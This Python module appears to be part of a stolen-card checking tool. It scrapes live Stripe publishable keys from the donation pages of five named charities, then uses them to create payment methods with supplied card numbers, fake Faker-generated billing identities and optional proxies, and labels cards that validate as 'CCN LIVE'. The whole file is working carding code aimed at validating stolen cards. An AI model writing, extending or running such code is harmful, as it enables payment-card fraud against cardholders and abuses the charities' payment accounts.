"""
Stripe Verified Gates - Uses StripeFlow helper with dynamically extracted PKs
Sites verified to allow direct Stripe tokenization

Configuration loaded from environment or scraped dynamically from each site.
No hardcoded keys - keys are extracted at runtime from donation pages.
"""

import requests
import re
import time
from typing import Tuple, Optional, Dict
from faker import Faker
from gates.stripe_live_flow import StripeFlow, StripeStatus

_pk_cache: Dict[str, Tuple[str, float]] = {}
PK_CACHE_TTL = 300

VERIFIED_SITES = {
    'foe': {
        'name': 'Friends of Earth',
        'donate_url': 'https://foe.org/donate/',
        'amount': '5.00',
    },
    'charitywater': {
        'name': 'Charity Water',
        'donate_url': 'https://donate.charitywater.org/',
        'amount': '5.00',
    },
    'donorschoose': {
        'name': 'DonorsChoose',
        'donate_url': 'https://www.donorschoose.org/donate',
        'amount': '5.00',
    },
    'newschools': {
        'name': 'NewSchools',
        'donate_url': 'https://www.newschools.org/donate/',
        'amount': '5.00',
    },
    'ywca': {
        'name': 'YWCA',
        'donate_url': 'https://www.ywca.org/donate/',
        'amount': '5.00',
    },
}


def _extract_stripe_pk(url: str, timeout: int = 15, proxy: dict = None) -> Optional[str]:
    """
    Dynamically extract Stripe publishable key from donation page.
    No hardcoded keys - scraped at runtime.
    Uses caching to reduce page fetches during mass runs.
    """
    cache_key = url
    if cache_key in _pk_cache:
        cached_pk, cached_time = _pk_cache[cache_key]
        if time.time() - cached_time < PK_CACHE_TTL:
            return cached_pk
    
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        
        proxies = None
        if proxy:
            proxies = {'http': proxy.get('http'), 'https': proxy.get('https')}
        
        r = session.get(url, timeout=timeout, allow_redirects=True, proxies=proxies)
        if r.status_code != 200:
            return None
        
        pk_matches = re.findall(r'pk_live_[a-zA-Z0-9]+', r.text)
        if pk_matches:
            pk = pk_matches[0]
            _pk_cache[cache_key] = (pk, time.time())
            return pk
        
        return None
    except Exception:
        return None


def _is_network_error(error_msg: str) -> bool:
    """Check if error indicates a network/proxy failure"""
    network_keywords = ['timeout', 'connection', 'proxy', 'network', 'refused', 'unreachable', 'ssl']
    return any(kw in error_msg.lower() for kw in network_keywords)


def stripe_verified_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                          site_key: str = 'foe', proxy: dict = None,
                          timeout: int = 30) -> Tuple[str, bool]:
    """
    Check card using a verified Stripe-enabled site.
    
    Dynamically extracts Stripe PK from the site at runtime.
    Uses StripeFlow helper for proper fingerprinting + PM creation.
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC
        site_key: Key from VERIFIED_SITES dict (foe, charitywater, donorschoose, newschools, ywca)
        proxy: Optional proxy dict
        timeout: Request timeout
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    site = VERIFIED_SITES.get(site_key)
    if not site:
        return (f"Error: Unknown site key '{site_key}'", False)
    
    donate_url = site['donate_url']
    
    stripe_pk = _extract_stripe_pk(donate_url, timeout, proxy)
    if not stripe_pk:
        return ("DECLINED - Could not extract Stripe key from site", False)
    
    flow = StripeFlow(stripe_pk, proxy=proxy, timeout=timeout)
    
    success, err = flow.get_fingerprint()
    if not success:
        proxy_alive = not _is_network_error(err) if err else False
        return (f"Error: Fingerprint failed - {err}", proxy_alive)
    
    fake = Faker()
    pm_id, error = flow.create_payment_method(
        card_num, card_mon, card_yer, card_cvc,
        billing_name=f"{fake.first_name()} {fake.last_name()}",
        billing_email=fake.email(),
        referrer=donate_url
    )
    
    if error:
        proxy_alive = not _is_network_error(error)
        return (f"{error}", proxy_alive)
    
    if pm_id:
        return (f"CCN LIVE - Payment Method Created", True)
    
    return ("DECLINED - Unknown error", False)


def foe_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
              proxy: dict = None) -> Tuple[str, bool]:
    """Friends of the Earth gate - AUTH only"""
    return stripe_verified_check(card_num, card_mon, card_yer, card_cvc, 'foe', proxy)


def charitywater_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                       proxy: dict = None) -> Tuple[str, bool]:
    """Charity Water gate - AUTH only"""
    return stripe_verified_check(card_num, card_mon, card_yer, card_cvc, 'charitywater', proxy)


def donorschoose_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                       proxy: dict = None) -> Tuple[str, bool]:
    """DonorsChoose gate - AUTH only"""
    return stripe_verified_check(card_num, card_mon, card_yer, card_cvc, 'donorschoose', proxy)


def newschools_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                     proxy: dict = None) -> Tuple[str, bool]:
    """NewSchools Venture Fund gate - AUTH only"""
    return stripe_verified_check(card_num, card_mon, card_yer, card_cvc, 'newschools', proxy)


def ywca_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
               proxy: dict = None) -> Tuple[str, bool]:
    """YWCA gate - AUTH only"""
    return stripe_verified_check(card_num, card_mon, card_yer, card_cvc, 'ywca', proxy)


if __name__ == '__main__':
    print("Testing FOE gate with decline card...")
    result, alive = foe_check('4000000000000002', '02', '29', '123')
    print(f"Result: {result}")
